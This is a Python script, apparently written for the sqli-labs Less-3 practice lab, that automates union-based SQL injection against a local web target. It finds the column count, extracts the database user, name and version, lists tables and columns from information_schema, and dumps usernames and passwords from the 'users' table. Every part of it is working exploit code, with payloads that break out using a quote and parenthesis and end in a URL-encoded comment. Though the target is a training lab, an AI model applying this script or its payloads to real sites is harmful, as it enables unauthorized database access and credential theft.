#By Seven
import requests

url='http://172.16.166.134/sqli-labs7/Less-3/?id='
def error(text):
    if 'error' in text: return True
    else: return False

def ColumnError(text):
    if 'different number of columns' in text: return True
    else: return False

def IsEmpty(text):#whether there is a result
    if 'Your Password:' not in text: return True
    else: return False

def ListParse(text):
    start='Your Password:'
    end='</font>\r\n\r\n</font> '
    separator=' : '
    pos1=text.find(start)
    pos2=text.find(end)
    return  text[pos1+len(start):pos2].split(separator)

def WordParse(text): #Parse the result
    start='Your Password:'
    end='</font>\r\n\r\n</font> '
    pos1=text.find(start)
    pos2=text.find(end)
    return text[pos1+len(start):pos2]

def columnNum(url):
    enum='1'
    num=1
    inject='1\') union select '+enum+'%23'
    r = requests.get(url + inject)
    while( ColumnError(r.text)):
        num+=1
        enum+=','+str(num)
        inject = '1\') union select ' + enum+'%23'
        r = requests.get(url + inject)
    return num

def sysInfo(url,columnNum):
    url+='-1\') union select '
    info=['user','database','version']
    for n in range(columnNum-1):
        url=url+'1,'
    url+='concat_ws(char(32,58,32),user(),database(),version());%23'
    r=requests.get(url)
    result=ListParse(r.text)
    return dict(zip(info,result))

def GetTables(url,dbname,columnNum):
    col=''
    for i in range(columnNum-1):
        col+=str(i)
        col+=','

    tables=[]
    enum=0
    while True:
        turl=url+'-1\') union select {0}table_name from information_schema.tables where table_schema=\'{1}\' LIMIT {2},1;%20%23'.format(col,dbname,enum)
        r = requests.get(turl)
        if IsEmpty(r.text): break
        tables.append(WordParse(r.text))
        enum+=1
    return tables

def ColumnName(url,tbname,dbname,columnNum):#get name of columns
    col = ''
    for i in range(columnNum - 1):
        col += str(i)
        col += ','

    tables = []
    enum = 0
    while True:
        turl = url + '-1\') union select {0}COLUMN_NAME from information_schema.columns where table_schema=\'{1}\' and table_name=\'{2}\' LIMIT {3},1;%20%23'.format(
            col, dbname,tbname, enum)
        r = requests.get(turl)
        if IsEmpty(r.text): break
        tables.append(WordParse(r.text))
        enum += 1
    return tables

def DumpTable(url,tbname):
    print("----------------\nTable %s:\n----------------"%tablename)
    enum = 0
    while True:
        turl = url + '-1\') union select 1,2,concat_ws(char(32,58,32),username, password) from {0} LIMIT {1},1;%20%23'.format(
         tbname, enum)
        r = requests.get(turl)
        if IsEmpty(r.text): break
        # print(r.text)
        print(WordParse(r.text))
        enum += 1
    print("----------------")
    return 0

columnNum=columnNum(url)
print("The Column of this table is:",columnNum)
info=sysInfo(url,3)
print(info)
res=GetTables(url,info['database'],columnNum)
print("These tables are in \'%s\' databases: %s"%(info['database'],res))
tablename='users'
ColumnNames=ColumnName(url,tablename,info['database'],columnNum)
print("The columns in \'%s\' table are:%s"%(tablename,ColumnNames))
DumpTable(url,tablename)